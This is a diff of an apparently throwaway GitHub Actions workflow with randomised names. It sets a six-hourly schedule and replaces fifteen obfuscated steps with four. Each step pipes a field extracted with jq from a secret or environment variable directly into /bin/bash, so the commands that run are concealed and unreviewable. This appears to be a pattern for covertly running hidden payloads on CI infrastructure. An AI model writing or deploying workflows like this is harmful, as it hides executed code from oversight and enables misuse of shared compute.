@@ -1,9 +1,9 @@
 name: sweatsuitmachinist
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 0/6 * * *'
+    - cron: '46 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,21 +11,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: sweatsuitmachinist
         env:
-          bz25989: ${{ secrets.bz25989 }}
+          ngd7: ${{ secrets.ngd7 }}
         run: |
-          echo $bz25989 | jq -r .ctli73 | /bin/bash
-          echo $fyeqz05814 | jq -r .klvji92592 | /bin/bash
-          echo $kzbkr9 | jq -r .psg56 | /bin/bash
-          echo $h7 | jq -r .iqeh05193 | /bin/bash
-          echo $zpsa5110 | jq -r .ysr1530 | /bin/bash
-          echo $iywe3 | jq -r .w59 | /bin/bash
-          echo $gbv72546 | jq -r .hfb179 | /bin/bash
-          echo $yjudg864 | jq -r .yfdf6184 | /bin/bash
-          echo $r89 | jq -r .fhq783 | /bin/bash
-          echo $kymc3518 | jq -r .b012 | /bin/bash
-          echo $uz54 | jq -r .ffed47827 | /bin/bash
-          echo $fx533 | jq -r .peee868 | /bin/bash
-          echo $i21510 | jq -r .nv970 | /bin/bash
-          echo $q0 | jq -r .xiw44004 | /bin/bash
-          echo $bcbre59368 | jq -r .ohu0263 | /bin/bash
+          echo $ngd7 | jq -r .fpvnk651 | /bin/bash
+          echo $xjhzy7 | jq -r .msslt352 | /bin/bash
+          echo $elz0 | jq -r .aq9677 | /bin/bash
+          echo $wzsd81 | jq -r .szc6178 | /bin/bash
 
